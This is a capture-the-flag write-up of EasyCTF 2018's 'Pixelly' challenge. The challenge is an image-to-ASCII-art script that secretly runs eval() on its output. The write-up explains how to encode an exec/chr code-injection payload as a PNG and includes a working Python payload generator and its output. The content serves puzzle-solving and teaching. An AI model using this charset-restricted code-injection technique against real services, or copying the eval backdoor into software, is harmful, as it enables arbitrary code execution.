# Pixelly

Pixelly was a 220 point challenge in EasyCTF 2018. Although not very realistic, it was quite amusing and thus deserves a writeup in my opinion.

## Challenge description

```
I've created a new ASCII art generator, and it works beautifully!
But I'm worried that someone might have put a backdoor in it. Maybe you should check out the source for me...

Service: http://c1.easyctf.com:12489/
Source: https://cdn.easyctf.com/184a3fed376b4aafbb34e54e1c77efba87efdbda978952271d033aad7fb54488_asciinator.py
```

## Service

The service basically lets us upload a picture and see its ASCII art representation, as we could have guessed.

## Analyzing the source code

The source code is the following:

```python
#!/usr/bin/env python3
# Modified from https://gist.github.com/cdiener/10491632

import sys
from PIL import Image
import numpy as np

# it's me flage!
flag = '<redacted>'

# settings
chars = np.asarray(list(' -"~rc()+=01exh%'))
SC, GCF, WCF = 1/10, 1, 7/4

# read file
img = Image.open(sys.argv[1])

# process
S = ( round(img.size[0]*SC*WCF), round(img.size[1]*SC) )
img = np.sum( np.asarray( img.resize(S) ), axis=2)
img -= img.min()
img = (1.0 - img/img.max())**GCF*(chars.size-1)

arr = chars[img.astype(int)]
arr = '\n'.join(''.join(row) for row in arr)
print(arr)

# hehehe
try:
    eval(arr)
except SyntaxError:
    pass
```

We already know that it transforms an image into its ASCII art representation.
Our "client" is right to believe there might be a backdoor, as demonstrated in the following totally discreet piece of code:
```python
# hehehe
try:
    eval(arr)
except SyntaxError:
    pass
```

`arr` is also the variable that is printed, which means that **it's the ASCII art representation of the image passed as a parameter**. Our goal is already quite obvious: we're going to make an image whose ASCII art representation is python code that prints the variable `flag`. We can observe that the charset is the following:

```python
chars = np.asarray(list(' -"~rc()+=01exh%'))
```

### What can we do with that?

Well, we can quickly see the following:

- we can construct **function calls** since we have **parentheses**;
- we can construct **integers** since we have **1** and **+**;
- we can construct **booleans** since we have **=**;
- we can assign **variables** since we have **=**, **r**, **c**, **e**, **x** and **h**;
- we can call any function composed of letters in **rcexh**, such as **exec** or **chr**;
- since we can use **chr** and **exec**, **we can basically execute any payload**.

So, an interesting payload for us will be **exec("print flag")**, which turns into **exec(chr(110 + 1 + 1) + "r" + chr(100 + 1 + 1 + 1 + 1 + 1) + chr(110) + chr(110 + 1 + 1 + 1 + 1 + 1 + 1) + "(" + chr(100 + 1 + 1) + chr(110 - 1 - 1) + chr(100 - 1 - 1 - 1) + chr(1 + 100 + 1 + 1) + ")")** using the available charset.

### How to craft the payload?

```python
img -= img.min()
img = (1.0 - img/img.max())**GCF*(chars.size-1)
```

If we take these two lines into account, and since we know that `GCF = 1`, it seems pretty straightforward to create a payload: we just have to make sure that the charset spans 16 values with the same difference between every two consecutive elements. This will help get proper rounding and therefore get the right character in the ASCII art representation.

**Spanning 16 values** means that at least one of the characters in our payload must be `chars[0]` (*a space*) and one must be `chars[15]` (*%*). In the payload proposed above, we already have spaces, but we're missing a "**%**" character. Fortunately, since "**%**" is the modulo operator in Python, we can easily add "**+ 1 % 1**" in one of our calls to `chr`, which will change absolutely nothing, but will result in our payload spanning the 16 values.

Our payload can therefore be **exec(chr(110 + 1 + 1) + "r" + chr(100 + 1 + 1 + 1 + 1 + 1) + chr(110) + chr(110 + 1 + 1 + 1 + 1 + 1 + 1) + "(" + chr(100 + 1 + 1) + chr(110 - 1 - 1) + chr(100 - 1 - 1 - 1) + chr(1 + 100 + 1 + 1 + 1 % 1) + ")")** .

Then, to make it easy to see a difference between our characters, we can decide to write each of them as the character whose code is `chars[index_of_char] * 16`, which will span the range **{0 .. 240}**.

### Handling resizing

Now, before our payload can do anything, we're going to have to deal with the following code:

```python
S = ( round(img.size[0]*SC*WCF), round(img.size[1]*SC) )
img = np.sum( np.asarray( img.resize(S) ), axis=2)
```

Since we have `SC = 1/10` and `WCF = 7/4`, this basically resizes the image to **7/40<sup>th</sup>** of its width and **1/10<sup>th</sup>** of its height.

While this probably won't be a problem heightwise (*we only want one line anyway*), **this is going to be a bit more complicated widthwise**. Indeed, the resize makes it so that only 7 out of 40 characters will be picked, and since 40 is not divisible by 7, we won't be able to just write **40/7** consecutive occurrences of the same character for it to be picked only once.

**40/7** is about **5.7**, which means that we're going to have to write each character **6 times** (*we can't write fractional characters, unfortunately*) for it to appear in the **ASCII art output**. However, because **6 is larger than 5.7**, there're going to be some leftover characters, meaning that **some characters will be duplicated**. Fortunately, this is not really a problem if we manage to make it so that the duplicated characters are **only spaces**.

## Implementing a solution

Using what we have now analyzed, we come up with the following first implementation:

```python
#!/usr/bin/python3

from PIL import Image

# Initializing the payload
payload = 'exec(chr(110 + 1 + 1) + "r" + chr(100 + 1 + 1 + 1 + 1 + 1) + chr(110) + chr(110 + 1 + 1 + 1 + 1 + 1 + 1) + "(" + chr(100 + 1 + 1) + chr(110 - 1 - 1) + chr(100 - 1 - 1 - 1) + chr(1 + 100 + 1 + 1 + 1 % 1) + ")")'

# Resetting the characters (needed here, although not very clean :)
chars = ' -"~rc()+=01exh%'

# Filling an array with the index of each letter in the list of the
# available characters, in range(0, 255, 16).
payload_array = [chr(chars.index(letter) * 16) for letter in payload]

# Creating three components for each byte, and copying this 3-byte sequence
# 6 times so as to withstand the resizing of the image.
rgb_string = ''.join([(chr(255 - ord(i)) + '\x00\x00') * 6 for i in payload_array])
rgb_string = bytes(ord(c) for c in rgb_string)

# Number of RGB components in the image
dim_img = int(len(rgb_string) / 3)

# Height of the image
height = 10
img = Image.frombytes('RGB', (dim_img, height), rgb_string * height)
img.save('payload.png')
```

And feed the resulting `payload.png` to **asciinator**:

```bash
$ python3 asciinator.py payload.png 
exec(chr(1110 + 1 + 1) + -r- + chhr(100 + 1 + 1 + 1 + 11 + 1) + chr(110) + chhr(110 + 1 + 1 + 1 + 11 + 1 + 1) + -(- + chhr(100 + 1 + 1) + chr((110   1   1) + chr(1000   1   1   1) + chr((1 + 100 + 1 + 1 + 1 %% 1) + -)-)
```

Like we thought, all the characters are rightly printed, but some of them are duplicated, but the output is pretty much what we want. We can notice another small problem though: `"` is replaced by `-` and `-` is replaced by **a space**. These replacements are consistent along the whole string, and for both replacements, **the character is replaced by the one directly before in our charset**. This hints at a rounding error, which we can probably fix by simply **replacing those characters by the one that follows them in our charset**.

We add the following lines after the declaration of `payload`:

```python
# Replacing characters that are badly rounded in the output
payload = payload.replace('"', '~')
payload = payload.replace('-', '"')
```
And we get the following output from the newly generated image:
```
$ python3 asciinator.py payload.pn
exec(chr(1110 + 1 + 1) + "r" + chhr(100 + 1 + 1 + 1 + 11 + 1) + chr(110) + chhr(110 + 1 + 1 + 1 + 11 + 1 + 1) + "(" + chhr(100 + 1 + 1) + chr((110 - 1 - 1) + chr(1000 - 1 - 1 - 1) + chr((1 + 100 + 1 + 1 + 1 %% 1) + ")")
```

### Chasing the proper payload

That's a bit better. Now, we want to deal with the duplicated characters. First, in order to make sure that the resizing always occurs in the same way, we're going to make our string much longer by padding it with lots of spaces, which will ensure it has the same length for each of our tries.

Then, we're going to **compare the output of the ASCII art generator code with our payload**, considering only the units that are not spaces (*we consider that a unit here is one of the non-empty elements from* `payload.split(' ')`). If we notice that such a **unit** is different from what it should be, we will **add spaces in front of it until the duplication occurs on one of these spaces**.

The following (**commented**) code does just that:

```python
import numpy as np
from PIL import Image

# Checks whether the payload is the same as its model, ignoring spaces
def check_payload_from_model(split_model, split_payload):

    model_count = 0
    payload_count = 0

    while payload_count < len(split_payload):
        if split_payload[payload_count] == '':
            payload_count += 1
            continue

        if split_model[model_count] == '':
            model_count += 1
            continue

        if split_model[model_count] != split_payload[payload_count]:
            return model_count

        model_count += 1
        payload_count += 1

    return -1

# Initializing the payload
payload = 'exec(chr(110 + 1 + 1) + "r" + chr(100 + 1 + 1 + 1 + 1 + 1) + chr(110) + chr(110 + 1 + 1 + 1 + 1 + 1 + 1) + "(" + chr(100 + 1 + 1) + chr(110 - 1 - 1) + chr(100 - 1 - 1 - 1) + chr(1 + 100 + 1 + 1 + 1 % 1) + ")")'

string_len = 7 * 40

# Padding the payload so that changing it later doesn't cause too many changes
payload = payload + (string_len - len(payload)) * ' '

# Initializing a string representing the chars
chars_str = ' -"~rc()+=01exh%'

# Creating the np array needed for the asciinator part of the code
chars = np.asarray(list(' -"~rc()+=01exh%'))

while True:
    # Cutting to string_len so that the length of the payload doesn't change
    payload = payload[:string_len]

    # Replacing characters that are badly rounded in the output
    payload = payload.replace('"', '~')
    payload = payload.replace('-', '"')

    # Filling an array with the index of each letter in the list of the
    # available characters, in range(0, 255, 16).
    payload_array = [chr(chars_str.index(letter) * 16) for letter in payload]

    # Creating three components for each byte, and copying this 3-byte sequence
    # 6 times so as to withstand the resizing of the image.
    rgb_string = ''.join([(chr(255 - ord(i)) + '\x00\x00') * 6 for i in payload_array])
    rgb_string = bytes(ord(c) for c in rgb_string)

    # Number of RGB components in the image
    dim_img = int(len(rgb_string) / 3)

    # Height of the image
    height = 10
    img = Image.frombytes('RGB', (dim_img, height), rgb_string * height)

    # asciinator ##############################################################
    SC, GCF, WCF = 1./10, 1, 7./4

    # Processing made by the program
    S = ( round(img.size[0]*SC*WCF), round(img.size[1]*SC) )
    img = np.sum( np.asarray( img.resize(S) ), axis=2)

    img -= img.min()
    img = (1.0 - img.astype(float)/img.max())**GCF*(chars.size-1)

    arr = chars[img.astype(int)]
    arr = '\n'.join(''.join(row) for row in arr)

    # asciinator end ##########################################################

    # Replacing the letters that change because of the rounding
    payload = payload.replace('"', '-')
    payload = payload.replace('~', '"')

    split_payload = payload.split(' ')

    # Only checking the first line which should contain our entire payload
    split_result = arr.split('\n')[0].split(' ')

    # Checking if any "unit" 
    idx_to_change = check_payload_from_model(split_payload, split_result)

    # Payload doesn't need to be changed anymore!
    if idx_to_change == -1:
        print(' '.join(split_result))
        # Writing the image to "payload.png"
        Image.frombytes('RGB', (dim_img, height), rgb_string * height).save('payload.png')
        break

    split_payload[idx_to_change] = ' ' + split_payload[idx_to_change]
    payload = ' '.join(split_payload)
```

We run the code:

```bash
$ python3 make_payload.py 
            exec(chr(110 + 1 +   1) + "r" + chr(100   + 1 + 1 + 1 + 1 +    1) + chr(110) +      chr(110 + 1 + 1 +   1 + 1 + 1 + 1) +     "(" + chr(100 + 1 +  1) + chr(110 - 1 -   1) + chr(100 - 1 -   1 - 1) + chr(1 +     100 + 1 + 1 + 1 % 1)  + ")")
```

and we obtain a payload that looks right!

Let's try the generated picture with `asciinator.py`:
```bash
$ python3 asciinator.py payload.png 
            exec(chr(110 + 1 +   1) + "r" + chr(100   + 1 + 1 + 1 + 1 +    1) + chr(110) +      chr(110 + 1 + 1 +   1 + 1 + 1 + 1) +     "(" + chr(100 + 1 +  1) + chr(110 - 1 -   1) + chr(100 - 1 -   1 - 1) + chr(1 +     100 + 1 + 1 + 1 % 1)  + ")")                                             
<redacted>
```

Yep, that was the flag!

Now we just have to upload the image to the website aaaand… Flagged!

**Flag: easyctf{wish_thi5_fl@g_was_1n_ASCII_@rt_t0o!}**

## Conclusion

Although the CTF mostly contained easy challenges, this one made me think a bit and I really enjoyed doing it! Will probably play this CTF again next year!
